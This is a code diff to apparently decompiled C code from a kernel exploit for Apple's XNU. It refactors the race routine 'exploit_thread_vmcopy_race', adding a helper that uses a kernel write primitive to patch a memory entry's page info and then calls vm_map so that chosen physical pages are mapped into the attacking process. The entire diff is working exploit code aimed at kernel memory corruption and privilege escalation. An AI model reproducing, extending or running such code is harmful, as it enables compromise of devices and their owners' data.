@@ -162,6 +162,24 @@ static inline void vmcopy_patch_memory_entry_page(__int64 kreadCtx, __int64 page
   kwrite_u64_via_kobject(kreadCtx, pageInfoKaddr, (__int64)scratch, 32);
 }
 
+static inline vm_address_t vmcopy_map_physical_page(
+        __int64 kreadCtx,
+        __int64 pageInfoKaddr,
+        uint32_t mappedPageRef,
+        uint32_t restorePageRef,
+        mem_entry_name_port_t objectHandle,
+        vm_offset_t physicalOffset,
+        __int128 scratch[2])
+{
+  vm_address_t mappedAddress = 0;
+
+  vmcopy_patch_memory_entry_page(kreadCtx, pageInfoKaddr, mappedPageRef, scratch);
+  vm_map(mach_task_self_, &mappedAddress, 0x4000u, 0, 1, objectHandle, physicalOffset, 0, 3, 3, 1u);
+  vmcopy_patch_memory_entry_page(kreadCtx, pageInfoKaddr, restorePageRef, scratch);
+
+  return mappedAddress;
+}
+
 static inline uint64_t vmcopy_page_info_addr_from_ref(uint32_t ref, uint64_t packedBase, uint64_t linearBase, uint32_t pageShift)
 {
   if ( (ref & 0x80000000u) != 0 )
@@ -7925,17 +7943,25 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
     v100 = v25;
     v101 = v25 + 272;
     v26 = v25 & 0xFFFFFFFFFFFFC000LL;
-    v152 = 0;
-    vmcopy_patch_memory_entry_page(*(uint64_t *)(someStruct + 8), v103, *(uint64_t *)(someStruct + 32), __dst);
-    vm_map(mach_task_self_, &v152, 0x4000u, 0, 1, object_handle, v23 & 0xFFFFFFFFFFFFC000LL, 0, 3, 3, 1u);
-    vmcopy_patch_memory_entry_page(*(uint64_t *)(someStruct + 8), v103, v102 >> v159, __dst);
+    v152 = vmcopy_map_physical_page(
+             *(uint64_t *)(someStruct + 8),
+             v103,
+             *(uint64_t *)(someStruct + 32),
+             v102 >> v159,
+             object_handle,
+             v23 & 0xFFFFFFFFFFFFC000LL,
+             __dst);
     v97 = qword_48008;
     v98 = v152;
-    v151 = 0;
-    vmcopy_patch_memory_entry_page(*(uint64_t *)(someStruct + 8), v103, *(uint64_t *)(someStruct + 32), __dst);
     v108 = v26;
-    vm_map(mach_task_self_, &v151, 0x4000u, 0, 1, object_handle, v26, 0, 3, 3, 1u);
-    vmcopy_patch_memory_entry_page(*(uint64_t *)(someStruct + 8), v103, v102 >> v159, __dst);
+    v151 = vmcopy_map_physical_page(
+             *(uint64_t *)(someStruct + 8),
+             v103,
+             *(uint64_t *)(someStruct + 32),
+             v102 >> v159,
+             object_handle,
+             v26,
+             __dst);
     v27 = v151;
     v150 = 0;
     memset(v180, 0, sizeof(v180));
@@ -8108,10 +8134,14 @@ LABEL_68:
     }
     v67 = vmcopy_page_info_ref_from_addr(v65, v109, v64, v159);
     v99 = v67;
-    v144 = 0;
-    vmcopy_patch_memory_entry_page(*(uint64_t *)(someStruct + 8), v103, *(uint64_t *)(someStruct + 32), __dst);
-    vm_map(mach_task_self_, &v144, 0x4000u, 0, 1, object_handle, v108, 0, 3, 3, 1u);
-    vmcopy_patch_memory_entry_page(*(uint64_t *)(someStruct + 8), v103, v102 >> v159, __dst);
+    v144 = vmcopy_map_physical_page(
+             *(uint64_t *)(someStruct + 8),
+             v103,
+             *(uint64_t *)(someStruct + 32),
+             v102 >> v159,
+             object_handle,
+             v108,
+             __dst);
     *(uint64_t *)(someStruct + 24) = v144 + v105;
     flush_cpu_cache(*(uint64_t *)(someStruct + 8), v101, *(uint32_t *)(someStruct + 656));
     memcpy(__dst, *(const void **)(someStruct + 24), sizeof(__dst));
@@ -8238,14 +8268,14 @@ LABEL_68:
     memcpy(*(void **)(someStruct + 24), v94, 0x130u);
     v87 = *(uint64_t *)(someStruct + 360) & 0xFFFFFFFFFFFFC000LL;
     v88 = *(uint64_t *)(someStruct + 360) & 0x3FFFLL;
-    v110 = 0;
-    vmcopy_patch_memory_entry_page(
-      *(uint64_t *)(someStruct + 8),
-      v103,
-      *(uint64_t *)(someStruct + 32),
-      (__int128 *)pageInfoPayload);
-    vm_map(mach_task_self_, &v110, 0x4000u, 0, 1, object_handle, v87, 0, 3, 3, 1u);
-    vmcopy_patch_memory_entry_page(*(uint64_t *)(someStruct + 8), v103, v102 >> v159, (__int128 *)pageInfoPayload);
+    v110 = vmcopy_map_physical_page(
+             *(uint64_t *)(someStruct + 8),
+             v103,
+             *(uint64_t *)(someStruct + 32),
+             v102 >> v159,
+             object_handle,
+             v87,
+             (__int128 *)pageInfoPayload);
     v89 = v110 + v88;
     *(uint64_t *)(someStruct + 352) = v110 + v88;
     *(uint64_t *)(v89 + 264) = 1094795585;
